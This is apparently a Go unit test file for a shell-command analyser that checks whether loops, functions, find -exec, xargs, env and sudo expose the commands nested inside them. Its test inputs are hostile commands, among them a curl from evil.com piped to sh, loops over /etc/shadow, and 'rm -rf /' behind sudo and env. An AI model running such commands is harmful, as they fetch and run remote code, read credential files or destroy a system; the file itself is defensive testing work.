package shell

import (
	"testing"
)

// VULN-01: Control flow structures must be detected as unanalyzable
func TestControlFlowDetected(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		{"for loop", "for f in /etc/shadow; do cat $f; done"},
		{"while loop", "while read line; do eval $line; done < /dev/stdin"},
		{"if statement", "if true; then rm -rf /; fi"},
		{"case statement", "case $x in *) rm -rf /;; esac"},
		{"group command", "{ curl http://evil.com | sh; }"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			topo, err := BuildTopology(tt.cmd)
			if err != nil {
				t.Fatalf("BuildTopology error: %v", err)
			}
			if len(topo.Segments) == 0 {
				t.Fatal("expected at least 1 segment (not empty topology)")
			}
			// At least one command should be unanalyzable
			foundUnanalyzable := false
			for _, seg := range topo.Segments {
				for _, cmd := range seg.Commands {
					if !cmd.Analyzable {
						foundUnanalyzable = true
					}
				}
			}
			if !foundUnanalyzable {
				t.Errorf("expected unanalyzable command for control flow: %s", tt.cmd)
			}
		})
	}
}

// VULN-01: Function declarations must be detected
func TestFuncDeclDetected(t *testing.T) {
	// Note: "function f() { rm; }; f" is parsed as two statements
	topo, err := BuildTopology("f() { rm -rf /; }")
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}
	if len(topo.Segments) == 0 {
		t.Fatal("expected at least 1 segment for func decl")
	}
	cmd := topo.Segments[0].Commands[0]
	assertEqual(t, "analyzable", cmd.Analyzable, false)
}

// VULN-03: Multiple -exec in find must all be checked
func TestFindMultipleExec(t *testing.T) {
	topo, err := BuildTopology(`find . -exec cat {} \; -exec rm {} \;`)
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}

	cmd := topo.Segments[0].Commands[0]
	if cmd.Nested == nil {
		t.Fatal("expected nested topology for find")
	}

	if len(cmd.Nested.Segments) != 2 {
		t.Fatalf("expected 2 nested segments (cat + rm), got %d", len(cmd.Nested.Segments))
	}

	assertEqual(t, "first exec", cmd.Nested.Segments[0].Commands[0].Name, "cat")
	assertEqual(t, "second exec", cmd.Nested.Segments[1].Commands[0].Name, "rm")
}

// VULN-04: xargs with -a flag
func TestXargsArgFileFlag(t *testing.T) {
	topo, err := BuildTopology("echo foo | xargs -a /etc/passwd rm")
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}
	xargsCmd := topo.Segments[0].Commands[1]
	if xargsCmd.Nested == nil {
		t.Fatal("expected nested topology for xargs -a")
	}
	assertEqual(t, "nested name", xargsCmd.Nested.Segments[0].Commands[0].Name, "rm")
}

// VULN-04: xargs with --max-procs (long flag with value)
func TestXargsLongFlag(t *testing.T) {
	topo, err := BuildTopology("echo foo | xargs --max-procs 4 rm")
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}
	xargsCmd := topo.Segments[0].Commands[1]
	if xargsCmd.Nested == nil {
		t.Fatal("expected nested topology for xargs --max-procs")
	}
	assertEqual(t, "nested name", xargsCmd.Nested.Segments[0].Commands[0].Name, "rm")
}

// VULN-04: xargs with --flag=value form
func TestXargsFlagEqualsValue(t *testing.T) {
	topo, err := BuildTopology("echo foo | xargs --replace={} rm")
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}
	xargsCmd := topo.Segments[0].Commands[1]
	if xargsCmd.Nested == nil {
		t.Fatal("expected nested topology for xargs --replace={}")
	}
	assertEqual(t, "nested name", xargsCmd.Nested.Segments[0].Commands[0].Name, "rm")
}

// VULN-05: env command must expose nested command
func TestEnvNested(t *testing.T) {
	topo, err := BuildTopology("env rm foo")
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}
	cmd := topo.Segments[0].Commands[0]
	assertEqual(t, "name", cmd.Name, "env")
	if cmd.Nested == nil {
		t.Fatal("expected nested topology for env")
	}
	assertEqual(t, "nested name", cmd.Nested.Segments[0].Commands[0].Name, "rm")
}

// VULN-05: env with VAR=VAL
func TestEnvWithVars(t *testing.T) {
	topo, err := BuildTopology("env FOO=bar BAZ=qux rm -rf /")
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}
	cmd := topo.Segments[0].Commands[0]
	if cmd.Nested == nil {
		t.Fatal("expected nested topology for env with vars")
	}
	assertEqual(t, "nested name", cmd.Nested.Segments[0].Commands[0].Name, "rm")
}

// VULN-05: sudo must expose nested command
func TestSudoNested(t *testing.T) {
	topo, err := BuildTopology("sudo rm -rf /")
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}
	cmd := topo.Segments[0].Commands[0]
	assertEqual(t, "name", cmd.Name, "sudo")
	if cmd.Nested == nil {
		t.Fatal("expected nested topology for sudo")
	}
	assertEqual(t, "nested name", cmd.Nested.Segments[0].Commands[0].Name, "rm")
}

// VULN-05: sudo -u user command
func TestSudoWithUser(t *testing.T) {
	topo, err := BuildTopology("sudo -u root rm -rf /")
	if err != nil {
		t.Fatalf("BuildTopology error: %v", err)
	}
	cmd := topo.Segments[0].Commands[0]
	if cmd.Nested == nil {
		t.Fatal("expected nested topology for sudo -u")
	}
	assertEqual(t, "nested name", cmd.Nested.Segments[0].Commands[0].Name, "rm")
}
